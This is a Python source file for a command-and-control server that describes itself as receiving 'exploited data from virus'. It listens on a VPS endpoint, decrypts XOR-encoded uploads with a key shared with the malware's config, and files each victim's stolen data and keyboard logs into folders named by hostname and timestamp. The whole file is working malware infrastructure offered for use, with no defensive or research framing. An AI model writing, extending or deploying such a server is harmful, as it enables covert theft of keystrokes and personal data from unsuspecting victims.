#!/usr/bin/env python3
"""
Simple C2 Server to receive exploited data from virus
Run this on your VPS: python3 c2_server.py
"""
import http.server
import socketserver
import urllib.parse
import json
import os
import base64
import hashlib
from datetime import datetime

PORT = 8080
DATA_DIR = "received_data"
# IMPORTANT: This must match C2_KEY in virus_config.py
C2_KEY = "default_key_change_me"

def decrypt_data(encrypted_data, key=None):
    """Decrypt XOR encrypted data"""
    if key is None:
        key = C2_KEY
    try:
        key_hash = hashlib.sha256(key.encode()).digest()
        data = base64.b64decode(encrypted_data)
        decrypted = bytearray()
        for i, byte in enumerate(data):
            decrypted.append(byte ^ key_hash[i % len(key_hash)])
        return bytes(decrypted).decode('utf-8', errors='ignore')
    except Exception as e:
        return None

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        """Handle POST requests from virus"""
        if self.path == '/api/collect':
            try:
                # Read POST data
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                
                # Parse form data
                parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))
                
                # Extract payload
                encrypted_data = parsed_data.get('data', [None])[0]
                key_hash = parsed_data.get('key', [None])[0]
                hostname = parsed_data.get('host', ['unknown'])[0]
                
                if encrypted_data:
                    # Create data directory
                    os.makedirs(DATA_DIR, exist_ok=True)
                    
                    # Create folder for this exfiltration: NameOfTheTarget_Time
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    target_folder = f"{DATA_DIR}/{hostname}_{timestamp}"
                    os.makedirs(target_folder, exist_ok=True)
                    
                    # Initialize filename variable
                    saved_filename = None
                    
                    # Decrypt the data
                    decrypted_json = decrypt_data(encrypted_data, C2_KEY)
                    
                    if decrypted_json:
                        try:
                            # Parse decrypted JSON
                            plain_data = json.loads(decrypted_json)
                            
                            # Save plain JSON (decrypted) - MAIN FILE
                            plain_filename = f"{target_folder}/exploited_data.json"
                            saved_filename = plain_filename
                            with open(plain_filename, 'w', encoding='utf-8') as f:
                                json.dump(plain_data, f, indent=2, ensure_ascii=False)
                            
                            # Extract and save keyboard logs separately for easy access
                            keyboard_logs = plain_data.get('keyboard_logs', '')
                            if keyboard_logs:
                                keyboard_log_file = f"{target_folder}/keyboard_log.txt"
                                with open(keyboard_log_file, 'w', encoding='utf-8') as f:
                                    f.write(keyboard_logs)
                                kb_size = len(keyboard_logs)
                                kb_lines = plain_data.get('keyboard_logs_lines', keyboard_logs.count('\n'))
                                print(f"    ⌨️  Keyboard logs saved: {keyboard_log_file} ({kb_size} chars, {kb_lines} lines)")
                            
                            # Save encrypted data (backup)
                            encrypted_filename = f"{target_folder}/encrypted_data.json"
                            with open(encrypted_filename, 'w') as f:
                                json.dump({
                                    'timestamp': timestamp,
                                    'hostname': hostname,
                                    'key_hash': key_hash,
                                    'encrypted_data': encrypted_data,
                                    'data_length': len(encrypted_data)
                                }, f, indent=2)
                            
                            # Extract statistics for quick view
                            stats = {}
                            if 'statistics' in plain_data:
                                stats = plain_data['statistics']
                            
                            print(f"[{datetime.now()}] ✅ Received & DECRYPTED data from {hostname}")
                            print(f"    📁 Folder: {target_folder}/")
                            print(f"    📄 Data: exploited_data.json")
                            print(f"    📊 Statistics: {json.dumps(stats, indent=2) if stats else 'N/A'}")
                            
                        except json.JSONDecodeError as e:
                            # Decrypted but not valid JSON - save as text
                            plain_filename = f"{target_folder}/exploited_data.txt"
                            saved_filename = plain_filename
                            with open(plain_filename, 'w', encoding='utf-8') as f:
                                f.write(decrypted_json)
                            print(f"[{datetime.now()}] ✅ Received & DECRYPTED data from {hostname} (saved as text)")
                            print(f"    📁 Folder: {target_folder}/")
                            print(f"    📄 Data: exploited_data.txt")
                    else:
                        # Decryption failed - save encrypted only
                        encrypted_filename = f"{target_folder}/encrypted_data.json"
                        saved_filename = encrypted_filename
                        with open(encrypted_filename, 'w') as f:
                            json.dump({
                                'timestamp': timestamp,
                                'hostname': hostname,
                                'key_hash': key_hash,
                                'encrypted_data': encrypted_data,
                                'data_length': len(encrypted_data),
                                'decryption_error': 'Failed to decrypt - check C2_KEY'
                            }, f, indent=2)
                        print(f"[{datetime.now()}] ⚠️  Received data from {hostname} but DECRYPTION FAILED")
                        print(f"    📁 Folder: {target_folder}/")
                        print(f"    📄 Encrypted: encrypted_data.json")
                        print(f"    ⚠️  Check if C2_KEY matches virus_config.py")
                    
                    # Also save raw POST data for debugging
                    debug_filename = f"{target_folder}/raw_post_data.txt"
                    with open(debug_filename, 'wb') as f:
                        f.write(post_data)
                    
                    # Send success response
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    response = {
                        'status': 'success', 
                        'message': 'Data received', 
                        'folder': target_folder,
                        'filename': saved_filename if saved_filename else 'unknown'
                    }
                    self.wfile.write(json.dumps(response).encode())
                else:
                    self.send_response(400)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    response = {'status': 'error', 'message': 'No data received'}
                    self.wfile.write(json.dumps(response).encode())
                    
            except Exception as e:
                print(f"[{datetime.now()}] Error processing request: {e}")
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                response = {'status': 'error', 'message': str(e)}
                self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Override to customize logging"""
        print(f"[{datetime.now()}] {format % args}")

def main():
    """Start C2 server"""
    with socketserver.TCPServer(("", PORT), C2Handler) as httpd:
        print(f"=" * 70)
        print(f"C2 Server started on port {PORT}")
        print(f"Listening for data at: http://0.0.0.0:{PORT}/api/collect")
        print(f"Received data will be saved to: {DATA_DIR}/")
        print(f"=" * 70)
        print(f"Press Ctrl+C to stop")
        print(f"=" * 70)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n[{datetime.now()}] Server stopped")

if __name__ == "__main__":
    main()

